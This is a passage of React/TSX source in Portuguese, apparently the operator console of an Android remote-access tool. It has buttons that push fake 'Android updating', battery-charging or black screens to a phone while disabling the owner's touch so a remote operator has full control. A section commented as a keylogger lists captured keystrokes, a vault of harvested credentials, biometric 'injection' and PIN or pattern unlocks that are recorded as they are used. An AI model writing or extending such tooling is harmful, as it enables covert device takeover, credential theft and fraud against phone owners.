                    color: currentDisguise?.active && currentDisguise.type === "battery" ? "#000" : "#86efac",
                    fontSize: "8px",
                    fontWeight: 700,
                    cursor: "pointer"
                  }}
                  title="Ativar Bateria"
                >
                  ⚡ Bateria
                </button>
                <button
                  type="button"
                  onClick={() => {
                    if (selectedCustomImage) {
                      handleActivateDisguise("custom_image", {
                        customImageUrl: selectedCustomImage,
                        imageWidth: customImageMeta?.width,
                        imageHeight: customImageMeta?.height
                      });
                    } else {
                      setIsDisguiseCollapsed(false);
                      showToast("Selecione uma imagem para ativar", "info");
                    }
                  }}
                  style={{
                    padding: "4px 2px",
                    background: currentDisguise?.active && currentDisguise.type === "custom_image" ? "#a855f7" : "#131826",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
                    color: currentDisguise?.active && currentDisguise.type === "custom_image" ? "#fff" : "#c084fc",
                    fontSize: "8px",
                    fontWeight: 700,
                    cursor: "pointer"
                  }}
                  title="Ativar Imagem Custom"
                >
                  🖼️ Custom
                </button>
              </div>
            </div>
          ) : (
            <>

          {/* 1. CARD: TELA PRETA (STANDBY / OFF) */}
          <div
            style={{
              background: "#0a0e18",
              border: `1px solid ${currentDisguise?.active && currentDisguise.type === "black" ? "#ff1a2a" : "#1a2234"}`,
              boxShadow: currentDisguise?.active && currentDisguise.type === "black" ? "0 0 10px rgba(255, 26, 42, 0.2)" : "none",
              borderRadius: "6px",
              padding: disguiseScale === "compact" ? "5px 7px" : disguiseScale === "large" ? "10px 12px" : "7px 9px",
              display: "flex",
              gap: disguiseScale === "compact" ? "6px" : disguiseScale === "large" ? "10px" : "8px",
              alignItems: "center"
            }}
          >
            {/* Lateral Mini Preview */}
            <MiniPhonePreview
              type="black"
              isActive={Boolean(currentDisguise?.active && currentDisguise.type === "black")}
              scale={disguiseScale}
            />

            {/* Right Content */}
            <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px", minWidth: 0 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                  <EyeOff size={disguiseScale === "compact" ? 10 : disguiseScale === "large" ? 14 : 12} style={{ color: "#94a3b8" }} />
                  <span style={{ fontSize: disguiseScale === "compact" ? "10px" : disguiseScale === "large" ? "12px" : "11px", fontWeight: 700, color: "#f8fafc" }}>
                    Tela Preta
                  </span>
                </div>
                {currentDisguise?.active && currentDisguise.type === "black" && (
                  <span style={{ fontSize: "8px", background: "#ff1a2a", color: "#fff", padding: "1px 4px", borderRadius: "3px", fontWeight: 800 }}>
                    ATIVA
                  </span>
                )}
              </div>

              <div style={{ fontSize: disguiseScale === "compact" ? "8px" : "9px", color: "#94a3b8", lineHeight: 1.2 }}>
                Display apagado · <span style={{ color: "#38bdf8", fontWeight: 700 }}>Toque OFF</span> · <span style={{ color: "#22c55e", fontWeight: 700 }}>Suporte Total</span>
              </div>

              <div style={{ display: "flex", gap: "4px", marginTop: "1px" }}>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("black")}
                  disabled={isActivatingDisguise}
                  style={{
                    flex: 1,
                    height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                    background: currentDisguise?.active && currentDisguise.type === "black" ? "rgba(255, 26, 42, 0.25)" : "#161f30",
                    border: `1px solid ${currentDisguise?.active && currentDisguise.type === "black" ? "#ff1a2a" : "#243249"}`,
                    borderRadius: "4px",
                    color: currentDisguise?.active && currentDisguise.type === "black" ? "#ff4d5a" : "#cbd5e1",
                    fontSize: disguiseScale === "compact" ? "8.5px" : disguiseScale === "large" ? "10.5px" : "9.5px",
                    fontWeight: 700,
                    padding: "0 6px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "4px"
                  }}
                  title={
                    currentDisguise?.active && currentDisguise.type === "black"
                      ? "Tela preta e bloqueio de toque ativos no aparelho. Suporte remoto operando."
                      : "Apagar tela do aparelho, desativar toque do usuário e liberar suporte remoto com total controle"
                  }
                >
                  <Zap size={10} />
                  <span>
                    {currentDisguise?.active && currentDisguise.type === "black"
                      ? "✓ Ativa · Toque OFF"
                      : "⚡ Ativar Tela Preta"}
                  </span>
                </button>
                {currentDisguise?.active && currentDisguise.type === "black" && (
                  <button
                    type="button"
                    onClick={handleClearDisguise}
                    style={{
                      width: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      background: "rgba(255, 26, 42, 0.15)",
                      border: "1px solid #ff4d5a",
                      color: "#ff808b",
                      borderRadius: "4px",
                      padding: 0,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center"
                    }}
                    title="Restaurar Aparelho Normal (Reativar Tela e Toque)"
                  >
                    <X size={10} />
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* 2. CARD: ATUALIZANDO ANDROID (SYSTEM UPDATE) */}
          <div
            style={{
              background: "#0a0e18",
              border: `1px solid ${currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#1a2234"}`,
              boxShadow: currentDisguise?.active && currentDisguise.type === "update" ? "0 0 10px rgba(0, 229, 255, 0.2)" : "none",
              borderRadius: "6px",
              padding: disguiseScale === "compact" ? "5px 7px" : disguiseScale === "large" ? "10px 12px" : "7px 9px",
              display: "flex",
              gap: disguiseScale === "compact" ? "6px" : disguiseScale === "large" ? "10px" : "8px",
              alignItems: "center"
            }}
          >
            {/* Lateral Mini Preview */}
            <MiniPhonePreview
              type="update"
              updatePercent={updatePercent}
              isActive={Boolean(currentDisguise?.active && currentDisguise.type === "update")}
              scale={disguiseScale}
            />

            {/* Right Content */}
            <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px", minWidth: 0 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                  <RotateCw size={disguiseScale === "compact" ? 10 : disguiseScale === "large" ? 14 : 12} style={{ color: "#00e5ff" }} />
                  <span style={{ fontSize: disguiseScale === "compact" ? "10px" : disguiseScale === "large" ? "12px" : "11px", fontWeight: 700, color: "#f8fafc" }}>
                    Atualizando Android
                  </span>
                </div>
                {currentDisguise?.active && currentDisguise.type === "update" && (
                  <span style={{ fontSize: "8px", background: "#00e5ff", color: "#000", padding: "1px 4px", borderRadius: "3px", fontWeight: 800 }}>
                    ATIVA ({updatePercent}%)
                  </span>
                )}
              </div>

              {/* Slider de Progresso Compacto */}
              <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
                <span style={{ fontSize: "8.5px", color: "#64748b" }}>Progresso:</span>
                <input
                  type="range"
                  min="5"
                  max="98"
                  value={updatePercent}
                  onChange={(e) => setUpdatePercent(Number(e.target.value))}
                  style={{ flex: 1, accentColor: "#00e5ff", cursor: "pointer", height: "3px" }}
                />
                <span style={{ fontSize: "9.5px", fontWeight: 800, color: "#00e5ff", minWidth: "24px", textAlign: "right" }}>
                  {updatePercent}%
                </span>
              </div>

              <div style={{ display: "flex", gap: "4px", marginTop: "1px" }}>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("update", { progressPercent: updatePercent })}
                  disabled={isActivatingDisguise}
                  style={{
                    flex: 1,
                    height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                    background: currentDisguise?.active && currentDisguise.type === "update" ? "rgba(0, 229, 255, 0.2)" : "rgba(0, 119, 255, 0.15)",
                    border: `1px solid ${currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#0077ff"}`,
                    borderRadius: "4px",
                    color: currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#60a5fa",
                    fontSize: disguiseScale === "compact" ? "8.5px" : disguiseScale === "large" ? "10.5px" : "9.5px",
                    fontWeight: 700,
                    padding: "0 6px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "4px"
                  }}
                >
                  <RotateCw size={10} />
                  <span>
                    {currentDisguise?.active && currentDisguise.type === "update"
                      ? "✓ Atualizar na Tela"
                      : "Ativar Atualização"}
                  </span>
                </button>
                {currentDisguise?.active && currentDisguise.type === "update" && (
                  <button
                    type="button"
                    onClick={handleClearDisguise}
                    style={{
                      width: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      background: "transparent",
                      border: "1px solid #475569",
                      color: "#94a3b8",
                      borderRadius: "4px",
                      padding: 0,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center"
                    }}
                    title="Restaurar Tela Normal"
                  >
                    <X size={10} />
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* 3. CARD: CARREGANDO BATERIA */}
          <div
            style={{
              background: "#0a0e18",
              border: `1px solid ${currentDisguise?.active && currentDisguise.type === "battery" ? "#22c55e" : "#1a2234"}`,
              boxShadow: currentDisguise?.active && currentDisguise.type === "battery" ? "0 0 10px rgba(34, 197, 94, 0.2)" : "none",
              borderRadius: "6px",
              padding: disguiseScale === "compact" ? "5px 7px" : disguiseScale === "large" ? "10px 12px" : "7px 9px",
              display: "flex",
              gap: disguiseScale === "compact" ? "6px" : disguiseScale === "large" ? "10px" : "8px",
              alignItems: "center"
            }}
          >
            {/* Lateral Mini Preview */}
            <MiniPhonePreview
              type="battery"
              batteryPercent={device.battery ?? 75}
              isActive={Boolean(currentDisguise?.active && currentDisguise.type === "battery")}
              scale={disguiseScale}
            />

            {/* Right Content */}
            <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px", minWidth: 0 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                  <BatteryCharging size={disguiseScale === "compact" ? 10 : disguiseScale === "large" ? 14 : 12} style={{ color: "#22c55e" }} />
                  <span style={{ fontSize: disguiseScale === "compact" ? "10px" : disguiseScale === "large" ? "12px" : "11px", fontWeight: 700, color: "#f8fafc" }}>
                    Carregando Bateria
                  </span>
                </div>
                {currentDisguise?.active && currentDisguise.type === "battery" && (
                  <span style={{ fontSize: "8px", background: "#22c55e", color: "#000", padding: "1px 4px", borderRadius: "3px", fontWeight: 800 }}>
                    ATIVA ({device.battery ?? 75}%)
                  </span>
                )}
              </div>

              <div style={{ display: "flex", alignItems: "center", gap: "4px", fontSize: disguiseScale === "compact" ? "8px" : "9px", color: "#86efac" }}>
                <Zap size={9} style={{ color: "#22c55e" }} />
                <span>Turbo Charge: <strong>{device.battery ?? 75}%</strong> · <span style={{ color: "#38bdf8" }}>Toque OFF</span></span>
              </div>

              <div style={{ display: "flex", gap: "4px", marginTop: "1px" }}>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("battery", { progressPercent: device.battery ?? 75 })}
                  disabled={isActivatingDisguise}
                  style={{
                    flex: 1,
                    height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                    background: currentDisguise?.active && currentDisguise.type === "battery" ? "rgba(34, 197, 94, 0.2)" : "rgba(34, 197, 94, 0.12)",
                    border: `1px solid ${currentDisguise?.active && currentDisguise.type === "battery" ? "#22c55e" : "rgba(34, 197, 94, 0.4)"}`,
                    borderRadius: "4px",
                    color: "#22c55e",
                    fontSize: disguiseScale === "compact" ? "8.5px" : disguiseScale === "large" ? "10.5px" : "9.5px",
                    fontWeight: 700,
                    padding: "0 6px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "4px"
                  }}
                >
                  <Zap size={10} />
                  <span>
                    {currentDisguise?.active && currentDisguise.type === "battery"
                      ? "✓ Ativa no Celular"
                      : "Ativar Tela Bateria"}
                  </span>
                </button>
                {currentDisguise?.active && currentDisguise.type === "battery" && (
                  <button
                    type="button"
                    onClick={handleClearDisguise}
                    style={{
                      width: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      background: "transparent",
                      border: "1px solid #475569",
                      color: "#94a3b8",
                      borderRadius: "4px",
                      padding: 0,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center"
                    }}
                    title="Restaurar Tela Normal"
                  >
                    <X size={10} />
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* 4. CARD: SELECIONAR IMAGEM PERSONALIZADA */}
          <div
            style={{
              background: "#0a0e18",
              border: `1px solid ${currentDisguise?.active && currentDisguise.type === "custom_image" ? "#a855f7" : "#1a2234"}`,
              boxShadow: currentDisguise?.active && currentDisguise.type === "custom_image" ? "0 0 10px rgba(168, 85, 247, 0.2)" : "none",
              borderRadius: "6px",
              padding: disguiseScale === "compact" ? "5px 7px" : disguiseScale === "large" ? "10px 12px" : "7px 9px",
              display: "flex",
              gap: disguiseScale === "compact" ? "6px" : disguiseScale === "large" ? "10px" : "8px",
              alignItems: "center"
            }}
          >
            {/* Lateral Mini Preview */}
            <MiniPhonePreview
              type="custom_image"
              customImageUrl={selectedCustomImage || undefined}
              isActive={Boolean(currentDisguise?.active && currentDisguise.type === "custom_image")}
              scale={disguiseScale}
            />

            {/* Right Content */}
            <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px", minWidth: 0 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                  <ImageIcon size={disguiseScale === "compact" ? 10 : disguiseScale === "large" ? 14 : 12} style={{ color: "#c084fc" }} />
                  <span style={{ fontSize: disguiseScale === "compact" ? "10px" : disguiseScale === "large" ? "12px" : "11px", fontWeight: 700, color: "#f8fafc" }}>
                    Imagem Custom
                  </span>
                </div>
                {currentDisguise?.active && currentDisguise.type === "custom_image" && (
                  <span style={{ fontSize: "8px", background: "#a855f7", color: "#fff", padding: "1px 4px", borderRadius: "3px", fontWeight: 800 }}>
                    ATIVA
                  </span>
                )}
              </div>

              <div style={{ fontSize: disguiseScale === "compact" ? "8px" : "9px", color: "#94a3b8" }}>
                Ideal: <span style={{ color: "#c084fc", fontWeight: 700 }}>720×1280</span> · <span style={{ color: "#38bdf8", fontWeight: 600 }}>Toque OFF</span>
              </div>

              {/* Presets Rápidos e Botão Upload em Linha Única sem quebra */}
              <div style={{ display: "flex", gap: "2px", alignItems: "center" }}>
                {SAMPLE_IMAGE_PRESETS.map((p) => (
                  <button
                    key={p.id}
                    type="button"
                    onClick={() => handleSelectPresetSample(p)}
                    style={{
                      flex: 1,
                      background: selectedCustomImage === p.url ? "rgba(168, 85, 247, 0.25)" : "#131826",
                      border: `1px solid ${selectedCustomImage === p.url ? "#a855f7" : "#1e293b"}`,
                      borderRadius: "3px",
                      color: selectedCustomImage === p.url ? "#c084fc" : "#cbd5e1",
                      fontSize: disguiseScale === "compact" ? "7.5px" : "8px",
                      fontWeight: 600,
                      padding: "2px 2px",
                      textAlign: "center",
                      cursor: "pointer",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis"
                    }}
                    title={p.name}
                  >
                    {p.name.split(" ")[0]}
                  </button>
                ))}
                <button
                  type="button"
                  onClick={() => fileInputRef.current?.click()}
                  style={{
                    background: "#1e293b",
                    border: "1px dashed #475569",
                    borderRadius: "3px",
                    color: "#c084fc",
                    fontSize: disguiseScale === "compact" ? "7.5px" : "8px",
                    fontWeight: 600,
                    padding: "2px 4px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    gap: "2px",
                    whiteSpace: "nowrap",
                    flexShrink: 0
                  }}
                  title="Carregar imagem local (720x1280)"
                >
                  <Upload size={8} />
                  <span>Upload</span>
                </button>
              </div>

              {/* Upload File Input Hidden */}
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*"
                style={{ display: "none" }}
                onChange={handleImageFileChange}
              />

              <div style={{ display: "flex", gap: "4px", marginTop: "1px" }}>
                <button
                  type="button"
                  onClick={() => {
                    if (!selectedCustomImage) {
                      showToast("Selecione um preset ou faça upload antes de enviar.", "info");
                      return;
                    }
                    handleActivateDisguise("custom_image", {
                      customImageUrl: selectedCustomImage,
                      imageWidth: customImageMeta?.width,
                      imageHeight: customImageMeta?.height
                    });
                  }}
                  disabled={!selectedCustomImage || isActivatingDisguise}
                  style={{
                    flex: 1,
                    height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                    background: currentDisguise?.active && currentDisguise.type === "custom_image" ? "rgba(168, 85, 247, 0.3)" : "var(--crimson-neon, #ff1a2a)",
                    border: "none",
                    borderRadius: "4px",
                    color: "#fff",
                    fontSize: disguiseScale === "compact" ? "8.5px" : disguiseScale === "large" ? "10.5px" : "9.5px",
                    fontWeight: 700,
                    padding: "0 6px",
                    cursor: selectedCustomImage ? "pointer" : "not-allowed",
                    opacity: selectedCustomImage ? 1 : 0.5,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "4px"
                  }}
                >
                  <Send size={9} />
                  <span>
                    {currentDisguise?.active && currentDisguise.type === "custom_image"
                      ? "✓ Imagem Ativa"
                      : "Enviar & Usar Tela"}
                  </span>
                </button>

                {currentDisguise?.active && currentDisguise.type === "custom_image" && (
                  <button
                    type="button"
                    onClick={handleClearDisguise}
                    style={{
                      width: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      background: "transparent",
                      border: "1px solid #475569",
                      color: "#94a3b8",
                      borderRadius: "4px",
                      padding: 0,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center"
                    }}
                    title="Restaurar Tela Normal"
                  >
                    <X size={10} />
                  </button>
                )}
              </div>
            </div>
          </div>
            </>
          )}
        </div>
      )}

      {/* =================================================================== */}
      {/* =================================================================== */}
      {/* ABA 2: SENHAS & DIGITAÇÃO UNIFICADAS (COFRE, BIOMETRIA & KEYLOGGER) */}
      {/* =================================================================== */}
      {activeMainTab === "senhas" && (
        <div style={{ flex: 1, overflowY: "auto", display: "flex", flexDirection: "column" }}>
          {/* Sub-selector de Navegação Unificada & Sincronizada */}
          <div
            style={{
              display: "flex",
              gap: "4px",
              padding: "6px 8px",
              background: "#080c16",
              borderBottom: "1px solid #1a2233",
              position: "sticky",
              top: 0,
              zIndex: 15
            }}
          >
            <button
              type="button"
              onClick={() => setSenhasSubTab("senhas")}
              style={{
                flex: 1,
                padding: "5px 6px",
                fontSize: "10px",
                fontWeight: 700,
                background: senhasSubTab === "senhas" ? "rgba(56, 189, 248, 0.2)" : "#0f172a",
                border: `1px solid ${senhasSubTab === "senhas" ? "#38bdf8" : "#1e293b"}`,
                color: senhasSubTab === "senhas" ? "#38bdf8" : "#94a3b8",
                borderRadius: "4px",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "4px"
              }}
            >
              <Key size={11} />
              <span>Senhas ({credentials.length})</span>
            </button>

            <button
              type="button"
              onClick={() => setSenhasSubTab("teclas")}
              style={{
                flex: 1,
                padding: "5px 6px",
                fontSize: "10px",
                fontWeight: 700,
                background: senhasSubTab === "teclas" ? "rgba(34, 197, 94, 0.2)" : "#0f172a",
                border: `1px solid ${senhasSubTab === "teclas" ? "#22c55e" : "#1e293b"}`,
                color: senhasSubTab === "teclas" ? "#22c55e" : "#94a3b8",
                borderRadius: "4px",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "4px"
              }}
            >
              <Keyboard size={11} />
              <span>Digitação ({logs.length})</span>
            </button>

            <button
              type="button"
              onClick={() => setSenhasSubTab("split")}
              style={{
                padding: "5px 8px",
                fontSize: "10px",
                fontWeight: 700,
                background: senhasSubTab === "split" ? "rgba(168, 85, 247, 0.2)" : "#0f172a",
                border: `1px solid ${senhasSubTab === "split" ? "#a855f7" : "#1e293b"}`,
                color: senhasSubTab === "split" ? "#c084fc" : "#94a3b8",
                borderRadius: "4px",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "3px"
              }}
              title="Exibir senhas e digitação sincronizadas no mesmo painel"
            >
              <Zap size={11} />
              <span>Sync</span>
            </button>
          </div>

          {/* SESSÃO 1: COFRE DE CREDENCIAIS & BIOMETRIA */}
          {(senhasSubTab === "senhas" || senhasSubTab === "split") && (
            <div style={{ padding: "8px", display: "flex", flexDirection: "column", gap: "8px" }}>
              {/* Card Biometria Cadastrada */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  background: "#0d111c",
                  padding: "6px 10px",
                  borderRadius: "6px",
                  border: "1px solid #1e293b"
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                  <Fingerprint size={16} style={{ color: "#a855f7" }} />
                  <div>
                    <div style={{ fontSize: "10.5px", fontWeight: 700, color: "#fff", display: "flex", alignItems: "center", gap: "4px" }}>
                      Biometria Cadastrada
                      <span style={{ fontSize: "8.5px", background: "rgba(168, 85, 247, 0.2)", color: "#c084fc", padding: "1px 4px", borderRadius: "3px" }}>ID 1</span>
                    </div>
                    <div style={{ fontSize: "9px", color: "#64748b" }}>Pronta para autenticação no aparelho</div>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={handleTriggerBiometricLocal}
                  disabled={isBiometricActive}
                  className="primary compact-btn"
                  style={{
                    fontSize: "10px",
                    padding: "4px 9px",
                    background: isBiometricActive ? "#a855f7" : "rgba(168, 85, 247, 0.25)",
                    borderColor: "#a855f7",
                    color: "#fff",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    gap: "4px"
                  }}
                  title="Injetar biometria instantaneamente no dispositivo"
                >
                  <Fingerprint size={12} className={isBiometricActive ? "animate-spin" : ""} />
                  <span>{isBiometricActive ? "Autenticando..." : "Acionar"}</span>
                </button>
              </div>

              {/* Header Bar com Contador e Ações */}
              <div
                style={{
                  background: "#0c0f1a",
                  border: "1px solid #1e293b",
                  borderRadius: "8px",
                  padding: "8px 10px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  gap: "8px"
                }}
              >
            <div>
              <div style={{ fontSize: "11px", fontWeight: 800, color: "#f8fafc", display: "flex", alignItems: "center", gap: "5px" }}>
                <ShieldCheck size={14} style={{ color: "#38bdf8" }} />
                <span>Cofre de Autenticação</span>
              </div>
              <div style={{ fontSize: "9.5px", color: "#64748b" }}>
                {credentials.length} credencial(is) gravada(s)
              </div>
            </div>

            <div style={{ display: "flex", gap: "5px" }}>
              <button
                type="button"
                onClick={handleDetectCredentials}
                disabled={isDetectingCreds}
                style={{
                  background: "rgba(56, 189, 248, 0.15)",
                  border: "1px solid #38bdf8",
                  borderRadius: "4px",
                  color: "#38bdf8",
                  fontSize: "10px",
                  fontWeight: 700,
                  padding: "4px 7px",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: "4px"
                }}
                title="Detectar biometria e senhas ativas no dispositivo"
              >
                <RefreshCw size={10} className={isDetectingCreds ? "animate-spin" : ""} />
                <span>{isDetectingCreds ? "Buscando..." : "Detectar"}</span>
              </button>

              <button
                type="button"
                onClick={() => setIsAddingCred(!isAddingCred)}
                style={{
                  background: isAddingCred ? "rgba(239, 68, 68, 0.2)" : "rgba(34, 197, 94, 0.15)",
                  border: `1px solid ${isAddingCred ? "#ef4444" : "#22c55e"}`,
                  borderRadius: "4px",
                  color: isAddingCred ? "#fca5a5" : "#86efac",
                  fontSize: "10px",
                  fontWeight: 700,
                  padding: "4px 8px",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: "4px"
                }}
                title={isAddingCred ? "Fechar cadastro" : "Gravar nova credencial"}
              >
                {isAddingCred ? <X size={11} /> : <Plus size={11} />}
                <span>{isAddingCred ? "Cancelar" : "+ Gravar"}</span>
              </button>
            </div>
          </div>

          {/* Quick Hardware Actions Banner: Digital Instantânea & Facial */}
          <div
            style={{
              background: "#080b14",
              border: "1px dashed rgba(168, 85, 247, 0.35)",
              borderRadius: "8px",
              padding: "8px",
              display: "flex",
              flexDirection: "column",
              gap: "6px"
            }}
          >
            <div style={{ fontSize: "10px", color: "#a855f7", fontWeight: 700, display: "flex", alignItems: "center", gap: "4px" }}>
              <Zap size={11} />
              <span>Ações Rápidas de Sensor:</span>
            </div>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "6px" }}>
              <button
                type="button"
                onClick={() => handleQuickUseBiometric("fingerprint")}
                disabled={Boolean(isUsingCredId)}
                style={{
                  background: "rgba(168, 85, 247, 0.12)",
                  border: "1px solid #a855f7",
                  borderRadius: "5px",
                  padding: "6px 8px",
                  color: "#d8b4fe",
                  fontSize: "10px",
                  fontWeight: 700,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: "5px"
                }}
              >
                <Fingerprint size={13} style={{ color: "#c084fc" }} />
                <span>Usar Digital</span>
              </button>

              <button
                type="button"
                onClick={() => handleQuickUseBiometric("face")}
                disabled={Boolean(isUsingCredId)}
                style={{
                  background: "rgba(0, 229, 255, 0.12)",
                  border: "1px solid #00e5ff",
                  borderRadius: "5px",
                  padding: "6px 8px",
                  color: "#67e8f9",
                  fontSize: "10px",
                  fontWeight: 700,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: "5px"
                }}
              >
                <ScanFace size={13} style={{ color: "#00e5ff" }} />
                <span>Usar Facial</span>
              </button>
            </div>
          </div>

          {/* WIDGET: DESENHAR OU DIGITAR PARA USAR & GRAVAR NO APARELHO */}
          <div
            style={{
              background: "#080c16",
              border: "1px solid #1e293b",
              borderRadius: "8px",
              padding: "9px",
              display: "flex",
              flexDirection: "column",
              gap: "8px"
            }}
          >
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <div style={{ fontSize: "10.5px", fontWeight: 800, color: "#38bdf8", display: "flex", alignItems: "center", gap: "5px" }}>
                <Key size={13} />
                <span>Desbloquear Aparelho (Grava ao Usar)</span>
              </div>
              <div style={{ display: "flex", gap: "3px" }}>
                <button
                  type="button"
                  onClick={() => setQuickUnlockMode("pattern")}
                  style={{
                    background: quickUnlockMode === "pattern" ? "rgba(56, 189, 248, 0.2)" : "#131826",
                    border: `1px solid ${quickUnlockMode === "pattern" ? "#38bdf8" : "#1e293b"}`,
                    color: quickUnlockMode === "pattern" ? "#38bdf8" : "#94a3b8",
                    fontSize: "9px",
                    fontWeight: 700,
                    padding: "2px 6px",
                    borderRadius: "3px",
                    cursor: "pointer"
                  }}
                >
                  Padrão
                </button>
                <button
                  type="button"
                  onClick={() => setQuickUnlockMode("pin")}
                  style={{
                    background: quickUnlockMode === "pin" ? "rgba(56, 189, 248, 0.2)" : "#131826",
                    border: `1px solid ${quickUnlockMode === "pin" ? "#38bdf8" : "#1e293b"}`,
                    color: quickUnlockMode === "pin" ? "#38bdf8" : "#94a3b8",
                    fontSize: "9px",
                    fontWeight: 700,
                    padding: "2px 6px",
                    borderRadius: "3px",
                    cursor: "pointer"
                  }}
                >
                  PIN
                </button>
              </div>
            </div>

            {quickUnlockMode === "pattern" ? (
              <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
                <MiniPatternGrid
                  points={newPatternPoints}
                  size={84}
                  interactive={true}
                  onPointClick={handlePatternPointClick}
                />
                <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "5px" }}>
                  <div style={{ fontSize: "9px", color: "#94a3b8" }}>
                    Sequência:{" "}
                    <span style={{ color: "#38bdf8", fontWeight: 800, fontFamily: "var(--font-mono)" }}>
                      {newPatternPoints.length > 0 ? newPatternPoints.map((p) => p + 1).join(" → ") : "Nenhum ponto"}
                    </span>
                  </div>
                  <div style={{ display: "flex", gap: "4px" }}>
                    <button
                      type="button"
                      onClick={handlePatternClear}
                      disabled={newPatternPoints.length === 0}
                      style={{
                        background: "transparent",
                        border: "1px solid #334155",
                        color: "#94a3b8",
                        borderRadius: "4px",
                        fontSize: "9px",
                        padding: "4px 6px",
                        cursor: newPatternPoints.length > 0 ? "pointer" : "not-allowed"
                      }}
                    >
                      Limpar
                    </button>
                    <button
                      type="button"
                      onClick={handleUseAndRecordPattern}
                      disabled={newPatternPoints.length < 2 || isUsingCredId === "new_pattern_exec"}
                      style={{
                        flex: 1,
                        background: "rgba(34, 197, 94, 0.2)",
                        border: "1px solid #22c55e",
                        color: "#86efac",
                        borderRadius: "4px",
                        fontSize: "9.5px",
                        fontWeight: 800,
                        padding: "4px 8px",
                        cursor: newPatternPoints.length >= 2 ? "pointer" : "not-allowed",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        gap: "4px"
                      }}
                    >
                      <Play size={10} className={isUsingCredId === "new_pattern_exec" ? "animate-spin" : ""} />
                      <span>{isUsingCredId === "new_pattern_exec" ? "Executando..." : "Executar & Gravar"}</span>
                    </button>
                  </div>
                </div>
              </div>
            ) : (
              <div style={{ display: "flex", gap: "6px", alignItems: "center" }}>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="Dígitos do PIN (ex: 1234)..."
                  value={quickPinInput}
                  onChange={(e) => setQuickPinInput(e.target.value.replace(/\D/g, ""))}
                  style={{
                    flex: 1,
                    background: "#050810",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    padding: "5px 8px",
                    fontSize: "11px",
                    color: "#fff",
                    fontFamily: "var(--font-mono)"
                  }}
                />
                <button
                  type="button"
                  onClick={handleUseAndRecordPin}
